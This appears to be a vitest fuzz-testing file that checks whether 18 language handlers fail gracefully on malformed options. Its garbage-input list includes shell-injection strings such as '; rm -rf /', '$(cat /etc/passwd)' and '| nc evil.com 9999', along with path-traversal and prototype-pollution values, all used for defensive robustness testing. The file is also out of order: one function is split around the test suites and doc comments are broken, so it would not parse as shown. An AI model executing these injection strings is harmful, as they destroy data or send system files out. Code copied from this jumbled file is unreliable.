/**
 * fuzz-common.test.ts
 *
 * Common fuzz-testing utilities for all 18 language handlers.
 *
 * These tests exercise handlers with random, malformed, and edge-case
 * option values to ensure they fail gracefully with meaningful error
 * messages rather than crashing or entering infinite loops.
 *
 * @module tests/handlers/fuzz-common
 */

import { describe, it, expect, beforeAll } from 'vitest';
import type { Handler, HandlerOptions, ValidationResult } from '../../core/handler';

// ─── Handler registry ──────────────────────────────────────────────────────────

/** All 18 known language identifiers. */
export const ALL_LANGUAGES = [
  'python', 'typescript', 'rust', 'r', 'julia',
  'csharp', 'go', 'java', 'kotlin', 'cpp',
  'swift', 'stata', 'sas', 'scala', 'ruby',
  'dart', 'php', 'elixir',
] as const;

export type HandlerName = (typeof ALL_LANGUAGES)[number];

/**
 * Maps each language to the required option key(s) that
 * generate() will check synchronously before doing any I/O.
 */
export const REQUIRED_OPTIONS: Record<HandlerName, string[]> = {
  python: ['entryPoints'],
  typescript: ['entryPoints'],
  rust: ['cratePath'],
  r: ['entryPoints'],
  julia: ['entryPoints'],
  csharp: ['projectPath'],
  go: ['modulePath'],
  java: ['entryPoints'],
  kotlin: ['projectPath'],
  cpp: ['projectPath'],
  swift: ['modulePath'],
  stata: ['entryPoints'],
  sas: ['entryPoints'],
  scala: ['entryPoints'],
  ruby: ['entryPoints'],
  dart: ['entryPoints'],
  php: ['entryPoints'],
  elixir: ['projectPath'],
};
// ─── Random option generators ──────────────────────────────────────────────────

/** Built-in option keys that all handlers recognise from BaseHandlerOptions. */
const COMMON_KEYS = ['output', 'pagination', 'watch'] as const;

/**
 * Generate a random string that looks nothing like a valid module path.
 * Used to verify that handlers reject clearly invalid entry points.
 */
export function randomGarbageString(): string {
  const garbage = [
    '',
    ' ',
    '\t',
    '\n',
    '\x00',
    String.fromCharCode(0x01, 0x02, 0x03),
    '; rm -rf /',
    '$(cat /etc/passwd)',
    '`id`',
    '| nc evil.com 9999',
    '> /dev/null',
    '< /dev/null',
    '&',
    '|| true',
    'null',
    'undefined',
    '[object Object]',
    '__proto__',
    'constructor',
    'prototype',
    '..',
    '../..',
    '/etc/passwd',
    'C:\\Windows\\System32\\cmd.exe',
    '~'.repeat(100),
    'a'.repeat(10000),
    '\u0000\u0001\u0002',
  ];
  return garbage[Math.floor(Math.random() * garbage.length)];
}

/**
 * Returns option objects with the required key set to a garbage value
 * (empty array, null, non-array for entryPoints, etc.).
 */
export function randomMalformedOptions(handlerName: HandlerName): Record<string, unknown> {
  const required = REQUIRED_OPTIONS[handlerName];
  const opts: Record<string, unknown> = { output: 'api/test' };

  for (const key of required) {
    const malformations: unknown[] = [
      null,
      undefined,
      '',
      ' ',
      0,
      false,
      {},
      [],
      [''],
      [' ', ''],
      [null],
      [undefined],
      [randomGarbageString()],
    ];
    opts[key] = malformations[Math.floor(Math.random() * malformations.length)];
  }

  return opts;
}

/**
 * Returns an option object with the required key set to a plausible-looking
 * but non-existent path (to test that errors mention the path).
 */
export function randomNonExistentPathOptions(handlerName: HandlerName): Record<string, unknown> {
  const required = REQUIRED_OPTIONS[handlerName];
  const opts: Record<string, unknown> = { output: 'api/test' };

  for (const key of required) {
    const bogusPaths: unknown[] = [
      '/nonexistent/path/xyz123',
      '/tmp/__does_not_exist__',
      '/dev/null/foo',
      '/../../etc/passwd',
      'C:\\Missing\\Folder',
      './not-here',
      '../not-here-either',
    ];
    opts[key] = bogusPaths[Math.floor(Math.random() * bogusPaths.length)];
  }

  return opts;
}

/**
// ─── Helpers for loading handlers ──────────────────────────────────────────────

/**
 * Dynamically import a handler module and return the handler object,
 * or `null` if the import fails (e.g. tests run in an environment
 * where the handler's runtime isn't available).
 */
export async function loadHandler(language: HandlerName): Promise<Handler | null> {
  try {
    const mod = await import(`../../handlers/${language}`);
    const key = `${language}Handler` as keyof typeof mod;
    const handler = mod[key] as Handler | undefined;
    return handler ?? null;
  } catch {
    return null;
  }
}

/**
 * Load all available handlers into a Map.
 */
export async function loadAllHandlers(): Promise<Map<HandlerName, Handler>> {
  const map = new Map<HandlerName, Handler>();
  for (const lang of ALL_LANGUAGES) {
    const h = await loadHandler(lang);
    if (h) map.set(lang, h);
  }
  return map;
}

// ─── Shared fuzz assertions (invariants) ───────────────────────────────────────

/**
 * Assert that calling `generate()` with the given options throws an
 * error with a message that looks meaningful (not a bare object, not
 * a generic crash).
 */
export async function assertMeaningfulError(
  handler: Handler,
  options: HandlerOptions & Record<string, unknown>,
): Promise<void> {
  try {
    await handler.generate(options);
    // If no throw, the call succeeded — that's fine, we can't assert an error.
  } catch (error: unknown) {
    const message =
      error instanceof Error
        ? error.message
        : typeof error === 'string'
          ? error
          : JSON.stringify(error);

    // The error message must contain something meaningful.
    expect(message).toBeTruthy();
    expect(message.length).toBeGreaterThan(0);

    // It should NOT be a generic "[object Object]" or JSON dump.
    expect(message).not.toBe('[object Object]');
    expect(message).not.toBe('{}');

    // It should be a string (not an object thrown bare).
    expect(typeof message).toBe('string');
  }
}

/**
 * Assert that validate() returns a well-formed ValidationResult even
 * when called with a clearly invalid path.
 */
export async function assertValidateShape(
  handler: Handler,
  sourcePath: string,
): Promise<void> {
  if (!handler.validate) return; // validate is optional

  const result: ValidationResult = await handler.validate(sourcePath);
  expect(result).toHaveProperty('valid');
  expect(typeof result.valid).toBe('boolean');
  expect(result).toHaveProperty('errors');
  expect(Array.isArray(result.errors)).toBe(true);
// ─── Tests ─────────────────────────────────────────────────────────────────────

describe('Fuzz invariants — all handlers', () => {
  let handlers: Map<HandlerName, Handler>;

  beforeAll(async () => {
    handlers = await loadAllHandlers();
  });

  it('discovers at least one handler', () => {
    expect(handlers.size).toBeGreaterThanOrEqual(1);
  });
});

describe.each(ALL_LANGUAGES.map((l) => [l]))('Fuzz: %s handler', (lang) => {
  let handler: Handler | null = null;
  const handlerName = lang as HandlerName;

  beforeAll(async () => {
    handler = await loadHandler(lang as HandlerName);
  });

  // ── Missing required options ────────────────────────────────────────────

  it('throws a meaningful error when required options are missing', async () => {
    if (!handler) return;
    await assertMissingRequiredOption(handler, handlerName);
  });

  // ── Malformed option values ──────────────────────────────────────────────

  it('does not crash on malformed option values (garbage)', async () => {
    if (!handler) return;
    for (let i = 0; i < 5; i++) {
      const opts = randomMalformedOptions(handlerName);
      await assertMeaningfulError(handler, opts as HandlerOptions & Record<string, unknown>);
    }
  });

  // ── Extra unknown keys are silently ignored ──────────────────────────────

  it('ignores extra unknown options without crashing', async () => {
    if (!handler) return;
    const base = randomValidShapedOptions(handlerName);
    const withExtras = {
      ...base,
      unknownKey1: 'someValue',
      unknownKey2: 42,
      unknownKey3: { nested: true },
      unknownKey4: null,
      [Symbol('test')]: 'symbolic',
    };
    // This should not crash — unknown keys should be silently passed through.
    try {
      await handler!.generate(withExtras as HandlerOptions & Record<string, unknown>);
    } catch (error: unknown) {
      // If it throws, the error must be about a path or I/O issue,
      // NOT about the unknown keys.
      const message = error instanceof Error ? error.message : String(error);
      expect(message.toLowerCase()).not.toContain('unknown key');
      expect(message.toLowerCase()).not.toContain('unexpected option');
    }
  });

  // ── Empty options object ─────────────────────────────────────────────────

  it('handles empty options without crashing (throws with meaningful error)', async () => {
    if (!handler) return;
    // Empty object — no output, no required options
    try {
      await handler.generate({} as HandlerOptions & Record<string, unknown>);
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : String(error);
      expect(message.length).toBeGreaterThan(0);
      expect(message).not.toBe('[object Object]');
    }
  });

  // ── Options with only `output` ───────────────────────────────────────────

  it('handles options with only output set (still throws about missing required)', async () => {
    if (!handler) return;
    try {
      await handler.generate({ output: 'api/test' } as HandlerOptions & Record<string, unknown>);
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : String(error);
      // Must mention something about the missing option or path
      expect(message.length).toBeGreaterThan(5);
    }
  });

  // ── Validate on non-existent paths ───────────────────────────────────────

  it('validate() returns correct shape even for non-existent paths', async () => {
    if (!handler?.validate) return;
    await assertValidateShape(handler, '');
    await assertValidateShape(handler, '/nonexistent/path');
    await assertValidateShape(handler, '\x00');
    await assertValidateShape(handler, ' ');
  });

  // ── Extremely long option strings ────────────────────────────────────────

  it('does not hang on extremely long string values in options', async () => {
    if (!handler) return;
    const longStr = 'x'.repeat(100000);
    const opts = randomValidShapedOptions(handlerName);

    // Inject the long string into every key position
    for (const key of Object.keys(opts)) {
      const polluted = { ...opts, [key]: longStr };
      try {
        await handler.generate(polluted as HandlerOptions & Record<string, unknown>);
      } catch {
        // Accept any error as long as it doesn't hang
      }
    }
  });

  // ── Prototype pollution attempts ─────────────────────────────────────────

  it('rejects options with __proto__ pollution attempt gracefully', async () => {
    if (!handler) return;
    const polluted = randomValidShapedOptions(handlerName) as Record<string, unknown>;
    polluted.__proto__ = { malicious: true };
    polluted.constructor = { prototype: { polluted: true } };

    try {
      await handler.generate(polluted as unknown as HandlerOptions & Record<string, unknown>);
    } catch {
      // Accept any graceful handling
    }
  });

  // ── Call generate() twice ────────────────────────────────────────────────

  it('can be called twice with different options without crashing', async () => {
    if (!handler) return;
    const opts1 = randomValidShapedOptions(handlerName);
    const opts2 = randomValidShapedOptions(handlerName);

    try {
      await handler.generate(opts1 as HandlerOptions & Record<string, unknown>);
    } catch {
      // first call may fail (I/O), that's ok
    }

    try {
      await handler.generate(opts2 as HandlerOptions & Record<string, unknown>);
    } catch {
      // second call may also fail, but must not crash
    }
  });
});

  for (const err of result.errors) {
    expect(typeof err).toBe('string');
  }
}

/**
 * Assert that a handler's generate() rejects missing required options
 * with a clear error message mentioning the missing option name.
 */
export async function assertMissingRequiredOption(
  handler: Handler,
  handlerName: HandlerName,
): Promise<void> {
  const required = REQUIRED_OPTIONS[handlerName];
  const minimalOptions = { output: 'api/test' } as HandlerOptions & Record<string, unknown>;

  try {
    await handler.generate(minimalOptions);
    // If it doesn't throw, the handler may have proceeded to I/O.
    // That's acceptable if the handler uses a sensible default.
  } catch (error: unknown) {
    const message =
      error instanceof Error
        ? error.message
        : typeof error === 'string'
          ? error
          : '';

    // The message should mention at least one of the required option keys
    const keyMentioned = required.some((key) => {
      const lower = message.toLowerCase();
      return lower.includes(key.toLowerCase());
    });

    // The handler's error must refer to the missing option.
    expect(keyMentioned).toBe(true);
  }
}

 * Returns a fully valid-looking options object for a handler.
 * The values are syntactically correct, but the paths/entry points
 * typically don't exist — so generate() may still throw at I/O time
 * rather than during the initial option check.
 */
export function randomValidShapedOptions(handlerName: HandlerName): Record<string, unknown> {
  const required = REQUIRED_OPTIONS[handlerName];
  const opts: Record<string, unknown> = { output: 'api/test' };

  if (Math.random() > 0.5) opts.pagination = true;
  if (Math.random() > 0.3) opts.watch = false;

  for (const key of required) {
    if (key === 'entryPoints') {
      opts[key] = Math.random() > 0.5
        ? ['src/index.ts']
        : ['lib/main.py', 'lib/utils.py'];
    } else if (key === 'cratePath') {
      opts[key] = '/tmp/fake-crate';
    } else if (key === 'modulePath') {
      opts[key] = '/tmp/fake-module';
    } else if (key === 'projectPath') {
      opts[key] = '/tmp/fake-project';
    }
  }

  return opts;
}

/**
 * Returns random option objects that are *missing* the handler's
 * required key(s) but may contain plausible other keys.
 */
export function randomMissingOptions(handlerName: HandlerName): Record<string, unknown> {
  const required = REQUIRED_OPTIONS[handlerName];
  const opts: Record<string, unknown> = { output: 'api/test' };

  // Randomly decide if pagination / watch are present
  if (Math.random() > 0.5) opts.pagination = Math.random() > 0.5;
  if (Math.random() > 0.7) opts.watch = Math.random() > 0.5;

  // Add some unknown extra keys
  if (Math.random() > 0.6) opts.extraKey = randomGarbageString();
  if (Math.random() > 0.3) opts.unknownOption = Math.floor(Math.random() * 100);

  // Ensure every required key is ABSENT (or set to undefined)
  for (const key of required) {
    // Deliberately omit the key
    if (Math.random() > 0.8) {
      // Sometimes set it to undefined
      (opts as Record<string, unknown>)[key] = undefined;
    }
    // Otherwise leave it missing entirely
  }

  return opts;
}

